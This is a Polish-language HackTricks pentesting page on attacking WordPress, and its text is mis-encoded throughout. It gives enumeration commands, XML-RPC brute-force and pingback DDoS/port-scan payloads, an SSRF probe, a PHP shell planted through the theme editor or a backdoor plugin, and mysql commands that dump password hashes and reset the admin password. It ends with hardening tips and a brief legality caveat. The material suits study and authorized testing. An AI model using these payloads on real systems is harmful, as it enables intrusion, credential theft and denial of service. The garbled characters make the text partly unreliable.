# Wordpress

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=wordpress), aby Å‚atwo tworzyÄ‡ i **automatyzowaÄ‡ przepÅ‚ywy pracy** z wykorzystaniem najbardziej zaawansowanych narzÄ™dzi spoÅ‚ecznoÅ›ciowych na Å›wiecie.\
Otrzymaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

## Podstawowe informacje

**PrzesÅ‚ane** pliki trafiajÄ… pod: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`\
**Pliki motywÃ³w moÅ¼na znaleÅºÄ‡ w /wp-content/themes/**, wiÄ™c jeÅ›li zmienisz pewne php motywu, aby uzyskaÄ‡ RCE, prawdopodobnie bÄ™dziesz uÅ¼ywaÄ‡ tej Å›cieÅ¼ki. Na przykÅ‚ad: KorzystajÄ…c z **motywu twentytwelve** moÅ¼esz **uzyskaÄ‡ dostÄ™p** do pliku **404.php** pod adresem: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)\
**Inny przydatny adres URL to:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

W pliku **wp-config.php** znajdziesz hasÅ‚o gÅ‚Ã³wne bazy danych.

DomyÅ›lne Å›cieÅ¼ki logowania do sprawdzenia: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **GÅ‚Ã³wne pliki WordPress**

* `index.php`
* `license.txt` zawiera przydatne informacje, takie jak zainstalowana wersja WordPress.
* `wp-activate.php` jest uÅ¼ywany do procesu aktywacji e-maili podczas konfigurowania nowej witryny WordPress.
* Foldery logowania (mogÄ… byÄ‡ zmienione nazwy, aby je ukryÄ‡):
* `/wp-admin/login.php`
* `/wp-admin/wp-login.php`
* `/login.php`
* `/wp-login.php`
* `xmlrpc.php` to plik reprezentujÄ…cy funkcjÄ™ WordPress, ktÃ³ra umoÅ¼liwia przesyÅ‚anie danych za pomocÄ… HTTP jako mechanizmu transportu i XML jako mechanizmu kodowania. Ten rodzaj komunikacji zostaÅ‚ zastÄ…piony przez [API REST WordPressa](https://developer.wordpress.org/rest-api/reference).
* Folder `wp-content` to gÅ‚Ã³wny katalog, w ktÃ³rym przechowywane sÄ… wtyczki i motywy.
* `wp-content/uploads/` to katalog, w ktÃ³rym przechowywane sÄ… wszystkie przesÅ‚ane pliki na platformÄ™.
* `wp-includes/` to katalog, w ktÃ³rym przechowywane sÄ… pliki rdzenia, takie jak certyfikaty, czcionki, pliki JavaScript i widÅ¼ety.
* `wp-sitemap.xml` W wersjach WordPressa 5.5 i nowszych WordPress generuje plik XML mapy witryny z wszystkimi publicznymi wpisami i publicznie zapytywalnymi typami wpisÃ³w i taksonomiami.

**Eksploatacja po zainfekowaniu**

* Plik `wp-config.php` zawiera informacje wymagane przez WordPress do poÅ‚Ä…czenia z bazÄ… danych, takie jak nazwa bazy danych, host bazy danych, nazwa uÅ¼ytkownika i hasÅ‚o, klucze autoryzacji i soli oraz prefiks tabeli bazy danych. Ten plik konfiguracyjny moÅ¼e rÃ³wnieÅ¼ byÄ‡ uÅ¼ywany do aktywowania trybu DEBUG, co moÅ¼e byÄ‡ przydatne podczas rozwiÄ…zywania problemÃ³w.

### Uprawnienia uÅ¼ytkownikÃ³w

* **Administrator**
* **Redaktor**: Publikuje i zarzÄ…dza swoimi i innymi wpisami
* **Autor**: Publikuje i zarzÄ…dza swoimi wÅ‚asnymi wpisami
* **WspÃ³Å‚autor**: Pisze i zarzÄ…dza swoimi wpisami, ale nie moÅ¼e ich publikowaÄ‡
* **Subskrybent**: PrzeglÄ…da wpisy i edytuje swÃ³j profil

## **Pasywne wyliczanie**

### **SprawdÅº wersjÄ™ WordPressa**

SprawdÅº, czy moÅ¼esz znaleÅºÄ‡ pliki `/license.txt` lub `/readme.html`

W **kodzie ÅºrÃ³dÅ‚owym** strony (przykÅ‚ad z [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

* grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
* `meta name`

![](<../../.gitbook/assets/image (1111).png>)

* Pliki linkujÄ…ce CSS

![](<../../.gitbook/assets/image (533).png>)

* Pliki JavaScript

![](<../../.gitbook/assets/image (524).png>)

### Pobierz wtyczki

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
{% endcode %}

### Pobierz motywy

{% code overflow="wrap" %}
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
{% endcode %}

### WyodrÄ™bnianie wersji ogÃ³lnie

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=wordpress), aby Å‚atwo budowaÄ‡ i **automatyzowaÄ‡ przepÅ‚ywy pracy** z wykorzystaniem najbardziej zaawansowanych narzÄ™dzi spoÅ‚ecznoÅ›ciowych na Å›wiecie.\
Otrzymaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

## Aktywna enumeracja

### Wtyczki i Motywy

Prawdopodobnie nie bÄ™dziesz w stanie znaleÅºÄ‡ wszystkich moÅ¼liwych Wtyczek i MotywÃ³w. Aby odkryÄ‡ je wszystkie, bÄ™dziesz musiaÅ‚ **aktywnie przeprowadziÄ‡ atak Brute Force na listÄ™ Wtyczek i MotywÃ³w** (na szczÄ™Å›cie istniejÄ… narzÄ™dzia automatyzujÄ…ce zawierajÄ…ce te listy).

### UÅ¼ytkownicy

**Atak Brute Force na ID**

MoÅ¼esz uzyskaÄ‡ poprawnych uÅ¼ytkownikÃ³w witryny WordPress poprzez przeprowadzenie ataku Brute Force na identyfikatory uÅ¼ytkownikÃ³w:
```
curl -s -I -X GET http://blog.example.com/?author=1
```
JeÅ›li odpowiedzi to **200** lub **30X**, oznacza to, Å¼e id jest **poprawne**. JeÅ›li odpowiedÅº to **400**, oznacza to, Å¼e id jest **nieprawidÅ‚owe**.

**wp-json**

MoÅ¼esz rÃ³wnieÅ¼ sprÃ³bowaÄ‡ uzyskaÄ‡ informacje o uÅ¼ytkownikach poprzez zapytanie:
```
curl http://blog.example.com/wp-json/wp/v2/users
```
Kolejny punkt koÅ„cowy `/wp-json/`, ktÃ³ry moÅ¼e ujawniÄ‡ pewne informacje o uÅ¼ytkownikach to:
```
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
ZauwaÅ¼, Å¼e ten punkt koÅ„cowy ujawnia tylko uÅ¼ytkownikÃ³w, ktÃ³rzy opublikowali post. **Dane bÄ™dÄ… udostÄ™pnione tylko dla uÅ¼ytkownikÃ³w, ktÃ³rzy majÄ… tÄ™ funkcjÄ™ wÅ‚Ä…czonÄ…**.

ZauwaÅ¼ rÃ³wnieÅ¼, Å¼e **/wp-json/wp/v2/pages** moÅ¼e ujawniaÄ‡ adresy IP.

#### Wyliczanie nazwy uÅ¼ytkownika logowania

Podczas logowania w **`/wp-login.php`** **komunikat** jest **inny**, jeÅ›li wskazana **nazwa uÅ¼ytkownika istnieje czy nie**.

### XML-RPC

JeÅ›li `xml-rpc.php` jest aktywny, moÅ¼na przeprowadziÄ‡ atak siÅ‚owy na poÅ›wiadczenia lub uÅ¼yÄ‡ go do uruchamiania atakÃ³w DoS na inne zasoby. (MoÅ¼esz zautomatyzowaÄ‡ ten proces [korzystajÄ…c z tego](https://github.com/relarizky/wpxploit) na przykÅ‚ad).

Aby sprawdziÄ‡, czy jest aktywny, sprÃ³buj uzyskaÄ‡ dostÄ™p do _**/xmlrpc.php**_ i wyÅ›lij to Å¼Ä…danie:

**SprawdÅº**
```markup
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Atak siÅ‚owy na dane uwierzytelniajÄ…ce**

**`wp.getUserBlogs`**, **`wp.getCategories`** lub **`metaWeblog.getUsersBlogs`** to niektÃ³re z metod, ktÃ³re moÅ¼na wykorzystaÄ‡ do ataku siÅ‚owego na dane uwierzytelniajÄ…ce. JeÅ›li uda ci siÄ™ znaleÅºÄ‡ ktÃ³rÄ…kolwiek z nich, moÅ¼esz wysÅ‚aÄ‡ coÅ› w stylu:
```markup
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
WiadomoÅ›Ä‡ _"NieprawidÅ‚owa nazwa uÅ¼ytkownika lub hasÅ‚o"_ w odpowiedzi kodu 200 powinna siÄ™ pojawiÄ‡, jeÅ›li poÅ›wiadczenia nie sÄ… poprawne.

![](<../../.gitbook/assets/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../.gitbook/assets/image (721).png>)

KorzystajÄ…c z poprawnych poÅ›wiadczeÅ„, moÅ¼esz przesÅ‚aÄ‡ plik. W odpowiedzi pojawi siÄ™ Å›cieÅ¼ka ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```markup
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
RÃ³wnieÅ¼ istnieje **szybszy sposÃ³b** Å‚amania poÅ›wiadczeÅ„ za pomocÄ… **`system.multicall`**, poniewaÅ¼ moÅ¼na wyprÃ³bowaÄ‡ kilka poÅ›wiadczeÅ„ w tej samej Å¼Ä…daniu:

<figure><img src="../../.gitbook/assets/image (628).png" alt=""><figcaption></figcaption></figure>

**OminiÄ™cie 2FA**

Ta metoda jest przeznaczona dla programÃ³w, a nie dla ludzi, i jest przestarzaÅ‚a, dlatego nie obsÅ‚uguje 2FA. Dlatego jeÅ›li masz waÅ¼ne poÅ›wiadczenia, ale gÅ‚Ã³wne wejÅ›cie jest chronione przez 2FA, **moÅ¼esz prÃ³bowaÄ‡ naduÅ¼yÄ‡ xmlrpc.php, aby zalogowaÄ‡ siÄ™ tymi poÅ›wiadczeniami, omijajÄ…c 2FA**. NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e nie bÄ™dziesz w stanie wykonaÄ‡ wszystkich dziaÅ‚aÅ„, jakie moÅ¼esz wykonaÄ‡ za pomocÄ… konsoli, ale nadal moÅ¼esz uzyskaÄ‡ dostÄ™p do RCE, tak jak to wyjaÅ›nia Ippsec w [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s)

**DDoS lub skanowanie portÃ³w**

JeÅ›li znajdziesz metodÄ™ _**pingback.ping**_ na liÅ›cie, moÅ¼esz sprawiÄ‡, Å¼e Wordpress wyÅ›le dowolne Å¼Ä…danie do dowolnego hosta/portu.\
MoÅ¼na to wykorzystaÄ‡ do zmuszenia **tysiÄ™cy** witryn **Wordpress** do **dostÄ™pu** do jednej **lokalizacji** (co powoduje **DDoS** w tej lokalizacji) lub moÅ¼na go uÅ¼yÄ‡ do **skenowania** pewnej wewnÄ™trznej **sieci** **Wordpressa** (moÅ¼na wskazaÄ‡ dowolny port).
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
JeÅ›li otrzymasz **faultCode** o wartoÅ›ci **wiÄ™kszej** niÅ¼ **0** (17), oznacza to, Å¼e port jest otwarty.

Przejrzyj uÅ¼ycie **`system.multicall`** w poprzedniej sekcji, aby dowiedzieÄ‡ siÄ™, jak naduÅ¼yÄ‡ tej metody w celu spowodowania ataku DDoS.

**DDoS**
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../.gitbook/assets/image (110).png>)

### wp-cron.php DoS

Ten plik zazwyczaj istnieje w gÅ‚Ã³wnym katalogu witryny Wordpress: **`/wp-cron.php`**\
Kiedy ten plik jest **odwoÅ‚ywany**, wykonywane jest "**ciÄ™Å¼kie**" zapytanie MySQL, dlatego moÅ¼e byÄ‡ wykorzystany przez **atakujÄ…cych** do **spowodowania** ataku typu **DoS**.\
Ponadto, domyÅ›lnie `wp-cron.php` jest wywoÅ‚ywany przy kaÅ¼dym zaÅ‚adowaniu strony (za kaÅ¼dym razem, gdy klient Å¼Ä…da dowolnej strony Wordpress), co na witrynach o duÅ¼ym ruchu moÅ¼e powodowaÄ‡ problemy (DoS).

Zaleca siÄ™ wyÅ‚Ä…czenie Wp-Cron i utworzenie prawdziwego zadania cron wewnÄ…trz hosta, ktÃ³re bÄ™dzie wykonywaÄ‡ wymagane czynnoÅ›ci w regularnych odstÄ™pach czasu (bez powodowania problemÃ³w).

### /wp-json/oembed/1.0/proxy - SSRF

SprÃ³buj uzyskaÄ‡ dostÄ™p do _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ i witryna Worpress moÅ¼e wysÅ‚aÄ‡ do Ciebie Å¼Ä…danie.

To jest odpowiedÅº, gdy to nie dziaÅ‚a:

![](<../../.gitbook/assets/image (365).png>)

### SSRF

{% embed url="https://github.com/t0gu/quickpress/blob/master/core/requests.go" %}

To narzÄ™dzie sprawdza, czy **methodName: pingback.ping** oraz Å›cieÅ¼ka **/wp-json/oembed/1.0/proxy** istniejÄ…, a jeÅ›li tak, prÃ³buje je wykorzystaÄ‡.

### Automatyczne NarzÄ™dzia
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=wordpress), aby Å‚atwo budowaÄ‡ i **automatyzowaÄ‡ przepÅ‚ywy pracy** z wykorzystaniem najbardziej zaawansowanych narzÄ™dzi spoÅ‚ecznoÅ›ciowych na Å›wiecie.\
Otrzymaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

## Uzyskaj dostÄ™p, nadpisujÄ…c jeden bit

WiÄ™cej niÅ¼ rzeczywisty atak, to ciekawostka. W CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) moÅ¼na byÅ‚o zmieniÄ‡ 1 bit w dowolnym pliku WordPressa. MoÅ¼na byÅ‚o zmieniÄ‡ pozycjÄ™ `5389` w pliku `/var/www/html/wp-includes/user.php`, aby zastÄ…piÄ‡ operacjÄ™ NOT (`!`) operacjÄ… NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modyfikacja pliku php z uÅ¼yciem motywu (wymagane dane uwierzytelniajÄ…ce administratora)**

WyglÄ…d â†’ Edytor motywÃ³w â†’ Szablon 404 (po prawej stronie)

ZmieÅ„ zawartoÅ›Ä‡ na php shell:

![](<../../.gitbook/assets/image (384).png>)

ZnajdÅº w internecie, jak uzyskaÄ‡ dostÄ™p do zaktualizowanej strony. W tym przypadku musisz uzyskaÄ‡ dostÄ™p tutaj: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

MoÅ¼esz uÅ¼yÄ‡:
```
use exploit/unix/webapp/wp_admin_shell_upload
```
## Wtyczka RCE

### Wtyczka PHP

MoÅ¼liwe jest przesÅ‚anie plikÃ³w .php jako wtyczki.\
UtwÃ³rz swoje tylne drzwi w PHP, na przykÅ‚ad:

![](<../../.gitbook/assets/image (183).png>)

NastÄ™pnie dodaj nowÄ… wtyczkÄ™:

![](<../../.gitbook/assets/image (722).png>)

PrzeÅ›lij wtyczkÄ™ i kliknij Zainstaluj teraz:

![](<../../.gitbook/assets/image (249).png>)

Kliknij na PrzetwÃ³rz:

![](<../../.gitbook/assets/image (70).png>)

Prawdopodobnie na pierwszy rzut oka nic siÄ™ nie stanie, ale jeÅ›li przejdziesz do MediÃ³w, zobaczysz przesÅ‚ane tylne drzwi:

![](<../../.gitbook/assets/image (462).png>)

OtwÃ³rz je i zobaczysz adres URL do wykonania odwrÃ³conego powÅ‚oki:

![](<../../.gitbook/assets/image (1006).png>)

### PrzesyÅ‚anie i aktywowanie zÅ‚oÅ›liwej wtyczki

Ta metoda polega na zainstalowaniu zÅ‚oÅ›liwej wtyczki, ktÃ³ra jest znana z podatnoÅ›ci i moÅ¼e byÄ‡ wykorzystana do uzyskania powÅ‚oki sieciowej. Proces ten odbywa siÄ™ za poÅ›rednictwem pulpitu WordPress, zgodnie z poniÅ¼szymi krokami:

1. **Pobieranie Wtyczki**: Wtyczka jest pobierana z takiego ÅºrÃ³dÅ‚a jak Exploit DB, na przykÅ‚ad [**tutaj**](https://www.exploit-db.com/exploits/36374).
2. **Instalacja Wtyczki**:
* PrzejdÅº do pulpitu WordPress, nastÄ™pnie udaj siÄ™ do `Pulpit > Wtyczki > PrzeÅ›lij wtyczkÄ™`.
* PrzeÅ›lij plik zip pobranej wtyczki.
3. **Aktywacja Wtyczki**: Po pomyÅ›lnej instalacji wtyczki, musi zostaÄ‡ aktywowana poprzez pulpit.
4. **Wykorzystanie**:
* Po zainstalowaniu i aktywowaniu wtyczki "reflex-gallery", moÅ¼na jÄ… wykorzystaÄ‡, poniewaÅ¼ jest znana z podatnoÅ›ci.
* Framework Metasploit udostÄ™pnia exploit dla tej podatnoÅ›ci. Poprzez zaÅ‚adowanie odpowiedniego moduÅ‚u i wykonanie okreÅ›lonych poleceÅ„, moÅ¼na ustanowiÄ‡ sesjÄ™ meterpreter, umoÅ¼liwiajÄ…c nieautoryzowany dostÄ™p do witryny.
* Warto zauwaÅ¼yÄ‡, Å¼e jest to tylko jedna z wielu metod wykorzystania witryny WordPress.

ZawartoÅ›Ä‡ obejmuje pomoc wizualnÄ… przedstawiajÄ…cÄ… kroki w pulpicie WordPress dotyczÄ…ce instalacji i aktywacji wtyczki. Jednak waÅ¼ne jest zauwaÅ¼enie, Å¼e wykorzystywanie podatnoÅ›ci w ten sposÃ³b jest nielegalne i niestosowne bez odpowiedniej autoryzacji. Te informacje powinny byÄ‡ uÅ¼ywane odpowiedzialnie i tylko w kontekÅ›cie legalnym, na przykÅ‚ad podczas testÃ³w penetracyjnych z wyraÅºnÄ… zgodÄ….

**Aby uzyskaÄ‡ bardziej szczegÃ³Å‚owe kroki, sprawdÅº:** [**https://www.hackingarticles.in/wordpress-reverse-shell/\*\***](https://www.hackingarticles.in/wordpress-reverse-shell/)

## Post Eksploatacja

WyciÄ…gnij nazwy uÅ¼ytkownikÃ³w i hasÅ‚a:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
ZmieÅ„ hasÅ‚o administratora:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Ochrona WordPressa

### Regularne Aktualizacje

Upewnij siÄ™, Å¼e WordPress, wtyczki i motywy sÄ… aktualne. PotwierdÅº rÃ³wnieÅ¼, Å¼e automatyczne aktualizacje sÄ… wÅ‚Ä…czone w pliku wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
### **Tylko instaluj zaufane wtyczki i motywy WordPress**.

### Wtyczki zabezpieczeÅ„

* [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
* [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
* [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Inne zalecenia**

* UsuÅ„ domyÅ›lnego uÅ¼ytkownika **admin**
* UÅ¼ywaj **mocnych haseÅ‚** i **2FA**
* Okresowo **sprawdzaj** uprawnienia uÅ¼ytkownikÃ³w
* **Ogranicz liczbÄ™ prÃ³b logowania** w celu zapobieÅ¼enia atakom Brute Force
* ZmieÅ„ nazwÄ™ pliku **`wp-admin.php`** i zezwalaj na dostÄ™p tylko wewnÄ™trznie lub z okreÅ›lonych adresÃ³w IP.

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Korzystaj z [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=wordpress), aby Å‚atwo budowaÄ‡ i **automatyzowaÄ‡ przepÅ‚ywy pracy** z wykorzystaniem najbardziej zaawansowanych narzÄ™dzi spoÅ‚ecznoÅ›ci na Å›wiecie.\
Otrzymaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
